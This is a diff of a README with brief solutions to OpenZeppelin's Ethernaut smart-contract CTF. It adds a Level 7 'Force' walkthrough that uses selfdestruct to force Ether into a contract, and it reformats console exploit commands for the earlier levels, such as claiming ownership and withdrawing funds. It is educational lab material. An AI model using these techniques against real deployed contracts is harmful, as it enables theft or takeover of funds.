@@ -2,7 +2,7 @@
 
 _The Ethernaut is a Web3/Solidity based wargame inspired by [overthewire.org](https://overthewire.org/wargames/), played in the Ethereum Virtual Machine. Each level is a smart contract that needs to be 'hacked'. The game is 100% open source and all levels are contributions made by other players._
 
-Brief solutions for OpenZeppelin's Ethernaut CTF. Writeups pending.
+Brief solutions to OpenZeppelin's Ethernaut CTF. 
 
 **Completed**
 
@@ -12,12 +12,13 @@ Brief solutions for OpenZeppelin's Ethernaut CTF. Writeups pending.
 [Level 3: Coin Flip](#CoinFlip)   
 [Level 4: Telephone](#Telephone)   
 [Level 5: Token](#Token)  
-[Level 6: Delegation](#Delegation)
+[Level 6: Delegation](#Delegation)  
+[Level 7: Force](#Force)
+
 
 <!---
 
 **Pending**
-[Level 7: Force](#Force)
 [Level 8: Vault](#Vault)
 [Level 9: King](#King)
 [Level 10: Re-entrancy](#Reentrancy)
@@ -88,16 +89,16 @@ Brief solutions for OpenZeppelin's Ethernaut CTF. Writeups pending.
 
 ```solidity
 // First, we contribute some ether:
-await contract.contribute({ value: 5 });
+await contract.contribute({ value: 5 })
 
 // Then we send some ether to make us the owner
-sendTransaction({ from: player, to: instance, value: 5 });
+sendTransaction({ from: player, to: instance, value: 5 })
 
 // Verify we have claimed ownership
-await contract.owner();
+await contract.owner()
 
 // Reduce balance to 0
-await contract.withdraw();
+await contract.withdraw()
 ```
 
 ## <a name='Fallout'></a> 2. Fallout
@@ -108,10 +109,10 @@ The contract's constructor is incorrectly titled `Fal1out` instead of `Fallout`.
 
 ```solidity
 // Call the function to claim ownership
-contract.Fal1out();
+contract.Fal1out()
 
 // Verify we have claimed ownership
-await contract.owner();
+await contract.owner()
 ```
 
 ## <a name='CoinFlip'></a> 3. Coin Flip
@@ -268,3 +269,53 @@ contract.sendTransaction({from:player, to:instance, data:msgdata})
 > await contract.owner()
 < 0x... // reflects the player address
 ```
+
+
+
+## <a name='Force'></a> 7. Force
+
+> The goal of this level is to make the balance of the contract greater than zero.
+
+The level gives us a simple contract, without any functions. However, we do get an adorable kitten. 
+
+```solidity
+/*
+                MEOW ?
+         /\_/\   /
+    ____/ o o \
+  /~____  =ø= /
+ (______)__m_m)
+*/
+```
+
+Typically, we would rely on a provided function to transfer value to the contract. Else, we would default to `fallback` or `receive` functions. Unfortunately, we have no functions -- no functions at all. Let’s determine a workaround.
+
+Within the [Security Considerations](https://docs.soliditylang.org/en/develop/security-considerations.html#sending-and-receiving-ether) section of the Solidity documentation, we learn that we can actually move Ether without message calls! We can designate a target address as the recipient for either (a) mining block rewards or (b) remaining value of a self-destructed contract. The latter seems more feasible.
+
+Let’s force Ether into our instance by (1) creating a contract, (2) providing the contract with a balance, and (3) have it `selfdestruct`, with the recipient as our instance. 
+
+Compile in Remix. Deploy without value. 
+
+```solidity
+// Check contract value
+> toWei(await getBalance('0x7a0bA04E8504Ba2AeAc986656B98b83dE1270b55'))
+⋖ '0' 
+
+// Send 10 Ether to contract
+> await web3.eth.sendTransaction({to:'0x7a0bA04E8504Ba2AeAc986656B98b83dE1270b55', from:player, value:10})
+
+// Check updated contract value
+> toWei(await getBalance('0x7a0bA04E8504Ba2AeAc986656B98b83dE1270b55'))
+⋖ '10' 
+
+// Check instance value
+> toWei(await getBalance(instance))
+⋖ '0' 
+
+// Execute `selfdestruct` from Remix, specifying the instance adress as the target address
+
+// Check updated instance value
+> toWei(await getBalance(instance))
+⋖ '10' 
+```
+Submit instance for completion.
